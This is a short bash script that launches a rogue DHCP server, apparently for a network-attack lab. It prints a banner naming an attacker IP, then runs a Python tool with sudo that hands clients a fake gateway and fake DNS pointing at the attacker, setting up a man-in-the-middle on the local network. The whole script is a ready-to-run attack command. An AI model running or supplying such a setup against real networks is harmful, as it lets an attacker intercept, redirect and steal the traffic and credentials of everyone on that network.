#!/bin/bash
# Script start Rogue DHCP Server
echo "=========================================================="
echo "  Starting Rogue DHCP Server (Poisoning Gateway & DNS)  "
echo "=========================================================="
echo "  Interface:      eth0"
echo "  Attacker IP:    10.10.0.20"
echo "  Fake Pool IP:   10.10.0.210"
echo "  Fake Gateway:   10.10.0.20"
echo "  Fake DNS:       10.10.0.20"
echo "=========================================================="

sudo python3 /usr/local/bin/rogue_dhcp.py --iface eth0 --fake-ip 10.10.0.210 --fake-gw 10.10.0.20 --fake-dns 10.10.0.20
